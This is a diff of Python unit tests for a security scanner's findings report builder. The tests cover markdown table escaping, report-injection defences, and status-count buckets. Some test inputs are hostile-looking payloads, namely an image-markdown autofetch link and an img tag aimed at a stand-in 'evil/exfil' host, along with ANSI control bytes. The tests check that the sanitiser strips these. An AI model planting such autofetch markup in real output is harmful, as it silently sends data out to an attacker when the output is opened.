@@ -1,13 +1,17 @@
-#!/usr/bin/env python3
 """Tests for findings-specific report building."""
 
+import re
 import unittest
+
 from core.reporting.findings import (
-    build_findings_rows, build_findings_summary, findings_summary_line,
-    findings_summary, build_findings_spec, build_finding_detail,
+    build_finding_detail,
+    build_findings_rows,
+    build_findings_spec,
+    build_findings_summary,
+    findings_summary,
+    findings_summary_line,
 )
 from core.reporting.renderer import render_report
-
 
 SAMPLE_FINDINGS = [
     {
@@ -31,7 +35,7 @@ SAMPLE_FINDINGS = [
     },
     {
         "finding_id": "FIND-0003",
-        "file_path": "/tmp/test/cmd.c",
+        "file_path": "./target/cmd.c",
         "start_line": 7,
         "vuln_type": "command_injection",
         "is_true_positive": True,
@@ -121,6 +125,48 @@ class TestFindingsSummary(unittest.TestCase):
         self.assertIn("out of 3", result)
 
 
+class TestMarkdownRowEscaping(unittest.TestCase):
+    """Consistency tests: finding-derived table cells are inert in the
+    rendered markdown summary — same escaping policy as the per-finding
+    detail table."""
+
+    def test_pipe_in_cells_does_not_add_columns(self):
+        findings = [{
+            "id": "F-1",
+            "file": "src/x|y.c",
+            "line": 3,
+            "vuln_type": "cmd|injection",
+            "cwe_id": "CWE-78|CWE-79",
+            "ruling": {"status": "confirmed"},
+        }]
+        result = findings_summary(findings)
+        # 7 columns → exactly 8 unescaped pipes per table line.
+        for line in result.splitlines():
+            if line.startswith("|"):
+                self.assertEqual(len(re.findall(r"(?<!\\)\|", line)), 8, line)
+
+    def test_newline_in_cell_stays_one_row(self):
+        findings = [{
+            "id": "F-1",
+            "file": "a.c\n# fake heading",
+            "line": 1,
+            "vuln_type": "xss",
+            "ruling": {"status": "confirmed"},
+        }]
+        result = findings_summary(findings)
+        self.assertNotIn("# fake heading", result.splitlines())
+
+    def test_console_rows_unescaped(self):
+        """The console path shares `build_findings_rows` — it must keep
+        raw cells (the console renderer does its own escaping)."""
+        findings = [{
+            "id": "F-1", "file": "x|y.c", "line": 1,
+            "vuln_type": "xss", "ruling": {"status": "confirmed"},
+        }]
+        rows = build_findings_rows(findings, filename_only=True)
+        self.assertIn("x|y.c:1", rows[0][3])
+
+
 class TestBuildFindingDetail(unittest.TestCase):
 
     def test_has_title_and_attributes(self):
@@ -148,6 +194,46 @@ class TestBuildFindingDetail(unittest.TestCase):
         section = build_finding_detail(finding, 1)
         self.assertIn("**Remediation:**", section.content)
         self.assertIn("strncpy", section.content)
+
+    def test_source_id_rendered_for_imported_finding(self):
+        """Imported findings keep their foreign id as ``source_id``
+        after normalisation to FIND-<n>; the detail table surfaces it
+        so the finding traces back to the producing pipeline."""
+        finding = {**SAMPLE_FINDINGS[0],
+                   "source_id": "src/auth.c:check_token:88"}
+        section = build_finding_detail(finding, 1)
+        self.assertIn(
+            "| Source ID | `src/auth.c:check_token:88` |",
+            section.content,
+        )
+
+    def test_no_source_id_row_when_absent(self):
+        section = build_finding_detail(SAMPLE_FINDINGS[0], 1)
+        self.assertNotIn("| Source ID |", section.content)
+
+    def test_function_slot_labeled_function_for_code_finding(self):
+        """Code findings (semgrep / codeql / agentic) put a real
+        function name in the ``function`` slot — labelled as
+        ``Function`` in the report."""
+        finding = {**SAMPLE_FINDINGS[0], "function": "process_input",
+                   "tool": "semgrep"}
+        section = build_finding_detail(finding, 1)
+        self.assertIn("| Function | `process_input` |", section.content)
+
+    def test_function_slot_labeled_dependency_for_sca_finding(self):
+        """SCA findings stuff the dep name into the ``function`` slot
+        because the generic shape requires SOMETHING there and SCA
+        doesn't have a code function. Renderer relabels as
+        ``Dependency`` so the operator doesn't read it as
+        ``urllib3 is a function called urllib3``.
+
+        Discovered 2026-05-21 by a dogfood SCA scan on raptor's
+        own repo."""
+        finding = {**SAMPLE_FINDINGS[0], "function": "urllib3",
+                   "tool": "sca"}
+        section = build_finding_detail(finding, 1)
+        self.assertIn("| Dependency | `urllib3` |", section.content)
+        self.assertNotIn("| Function | `urllib3` |", section.content)
 
     def test_patch_code_in_code_block(self):
         finding = {**SAMPLE_FINDINGS[0], "patch_code": "strncpy(dst, src, sizeof(dst));"}
@@ -234,7 +320,7 @@ class TestBuildFindingsSpec(unittest.TestCase):
         spec = build_findings_spec(
             SAMPLE_FINDINGS,
             title="Test Report",
-            metadata={"Target": "/tmp/test"},
+            metadata={"Target": "./target"},
         )
         self.assertEqual(spec.title, "Test Report")
         self.assertEqual(len(spec.table_rows), 3)
@@ -269,6 +355,192 @@ class TestBuildFindingsSpec(unittest.TestCase):
     def test_no_details(self):
         spec = build_findings_spec(SAMPLE_FINDINGS, include_details=False)
         self.assertEqual(len(spec.detail_sections), 0)
+
+
+class TestSpecPathEscapedExactlyOnce(unittest.TestCase):
+    """One defang owner per surface: rows and titles destined for the
+    spec renderer arrive RAW and are escaped exactly once at the
+    renderer's chokepoint. Pre-fix they were pre-escaped here too —
+    the File cell's wrapping backticks entity-escaped into literal
+    ``&#96;`` characters (rendered as backticks, never a code span)
+    and the ``\\|`` pipe escape survived as a visible stray backslash
+    on every rendered report."""
+
+    FINDINGS = [{
+        "id": "FIND-0001",
+        "vuln_type": "sql_injection",
+        "file": "src/a|b.py",
+        "line": 10,
+        "final_status": "confirmed",
+    }]
+
+    def test_table_cell_single_escaped(self):
+        report = render_report(build_findings_spec(self.FINDINGS))
+        self.assertNotIn("&#96;", report)
+        self.assertNotIn("\\&#124;", report)
+        self.assertIn("src/a&#124;b.py:10", report)
+
+    def test_detail_heading_has_no_entity_backticks(self):
+        report = render_report(build_findings_spec(self.FINDINGS))
+        heading = next(
+            line for line in report.splitlines()
+            if line.startswith("### FIND-0001")
+        )
+        self.assertNotIn("&#96;", heading)
+        self.assertIn("src/a", heading)
+
+    def test_direct_markdown_path_unchanged(self):
+        # findings_summary emits final markdown itself — its cells
+        # keep the single findings-side escape (backtick-wrapped File
+        # cell, escaped pipe).
+        out = findings_summary(self.FINDINGS)
+        self.assertIn("`src/a\\|b.py:10`", out)
+
+
+class TestMdTableCellAutofetch(unittest.TestCase):
+    """Report-injection: finding-derived cell values must not render
+    autofetch markup (same defense the LLM-output sanitiser applies —
+    an `![](url)` in a file path or scanner message otherwise fires
+    an exfil request when the report is opened in a browser)."""
+
+    def test_image_markup_stripped(self):
+        from core.reporting.findings import _md_table_cell
+        out = _md_table_cell("pre ![x](http://evil/exfil?q=1) post")
+        self.assertNotIn("![", out)
+        self.assertNotIn("http://evil", out)
+        self.assertIn("[REDACTED-AUTOFETCH-MARKUP]", out)
+
+    def test_html_img_tag_stripped(self):
+        from core.reporting.findings import _md_table_cell
+        out = _md_table_cell('<img src="http://evil/x">')
+        self.assertNotIn("img", out)
+        self.assertNotIn("http://evil", out)
+
+    def test_legitimate_function_signature_survives(self):
+        from core.reporting.findings import _md_table_cell
+        out = _md_table_cell("check_pw(user, pw) | validate[0]")
+        self.assertIn("check_pw(user, pw)", out)
+        self.assertIn("\\|", out)
+
+    def test_existing_escapes_unchanged(self):
+        from core.reporting.findings import _md_table_cell
+        self.assertEqual(_md_table_cell("a|b"), "a\\|b")
+        self.assertEqual(_md_table_cell("a\nb"), "a<br>b")
+
+    def test_control_and_bidi_bytes_escaped(self):
+        # sanitise_code's docstring names the threat: ANSI/BIDI/
+        # control-byte injection via terminal emulators (cat
+        # report.md). The prose lanes go through sanitise_string;
+        # this hand-rolled cell lane must escape too — file/function/
+        # vuln_type/code_line cells are hostile-influenceable.
+        from core.reporting.findings import _md_table_cell
+        out = _md_table_cell("evil\x1b[2Jname\x07")
+        self.assertNotIn("\x1b", out)
+        self.assertNotIn("\x07", out)
+        self.assertIn("evil", out)
+        self.assertNotIn("‮", _md_table_cell("a‮b"))
+        # Carriage returns keep the one-line <br> rendering.
+        self.assertEqual(_md_table_cell("a\r\nb"), "a<br>b")
+        self.assertEqual(_md_table_cell("a\rb"), "a<br>b")
+
+    def test_backtick_replaced_not_escaped(self):
+        # Backslash escapes are inert inside code spans, so cells that
+        # callers wrap in `...` must have NO backtick at all — a
+        # target-controlled "f` [link](url) `" otherwise terminates
+        # the span and its markdown renders live.
+        from core.reporting.findings import _md_table_cell
+        out = _md_table_cell("f` [link](url) `")
+        self.assertNotIn("`", out)
+        self.assertEqual(_md_table_cell("a`b"), "aʼb")
+
+
+class TerminalStatusBucketsTest(unittest.TestCase):
+    """not_disproven and confirmed_unverified are legitimate TERMINAL
+    statuses — neither may fall into the 'other' bucket that feeds the
+    possible-pipeline-bug warning, and unverified must never count as
+    an unrestricted (verified) confirmation."""
+
+    def test_not_disproven_has_its_own_bucket(self):
+        counts = build_findings_summary(
+            [{"final_status": "not_disproven"}])
+        self.assertEqual(counts["not_disproven"], 1)
+        self.assertEqual(counts["other"], 0)
+
+    def test_confirmed_unverified_not_counted_as_unrestricted(self):
+        counts = build_findings_summary(
+            [{"final_status": "confirmed_unverified"}])
+        self.assertEqual(counts["confirmed_unverified"], 1)
+        self.assertEqual(counts["confirmed_unrestricted"], 0)
+        self.assertEqual(counts["confirmed"], 0)
+        self.assertEqual(counts["other"], 0)
+
+    def test_genuinely_unknown_status_still_flags_other(self):
+        counts = build_findings_summary(
+            [{"final_status": "flurgle_state"}])
+        self.assertEqual(counts["other"], 1)
+
+    def test_summary_line_names_the_new_buckets(self):
+        from core.reporting.findings import findings_summary_line
+        counts = build_findings_summary([
+            {"final_status": "not_disproven"},
+            {"final_status": "confirmed_unverified"},
+        ])
+        line = findings_summary_line(counts)
+        self.assertIn("1 Not Disproven", line)
+        self.assertIn("1 Confirmed (Unverified)", line)
+
+
+class RuledOutUnverifiedBucketTest(unittest.TestCase):
+    """An unverified rule-out is a quarantined claim, not a verified
+    negative: it must not add to the ruled_out bucket (which grants
+    the count suppression weight in summaries) and must not trip the
+    'other'/pipeline-bug warning either — same doctrine as
+    confirmed_unverified on the confirm side."""
+
+    def test_not_counted_as_ruled_out(self):
+        counts = build_findings_summary(
+            [{"final_status": "ruled_out_unverified"}])
+        self.assertEqual(counts["ruled_out_unverified"], 1)
+        self.assertEqual(counts["ruled_out"], 0)
+        self.assertEqual(counts["other"], 0)
+
+    def test_summary_line_names_the_bucket(self):
+        from core.reporting.findings import findings_summary_line
+        counts = build_findings_summary([
+            {"final_status": "ruled_out_unverified"},
+            {"final_status": "ruled_out"},
+        ])
+        line = findings_summary_line(counts)
+        parts = [p.strip("* .") for p in
+                 line.split(" out of ")[0].split(", ")]
+        self.assertIn("1 Ruled Out (Unverified)", parts)
+        self.assertIn("1 Ruled Out", parts)
+
+
+class TestChainBreaksShapes(unittest.TestCase):
+    """feasibility.chain_breaks is finding-supplied JSON — only a
+    list renders as blockers; dict shapes crashed the slice and
+    string shapes rendered one comma-joined character per blocker."""
+
+    def _detail(self, chain_breaks):
+        finding = {
+            "id": "F-1", "vuln_type": "buffer_overflow",
+            "file": "a.c", "line": 1,
+            "feasibility": {"chain_breaks": chain_breaks},
+        }
+        return build_finding_detail(finding, 1).content
+
+    def test_list_renders_blockers(self):
+        content = self._detail(["no gadget", "full RELRO"])
+        self.assertIn("**Blockers:** no gadget, full RELRO", content)
+
+    def test_dict_shape_no_crash_no_blockers(self):
+        content = self._detail({"a": 1})
+        self.assertNotIn("Blockers", content)
+
+    def test_string_shape_not_split_per_char(self):
+        content = self._detail("nope")
+        self.assertNotIn("n, o, p", content)
 
 
 if __name__ == "__main__":
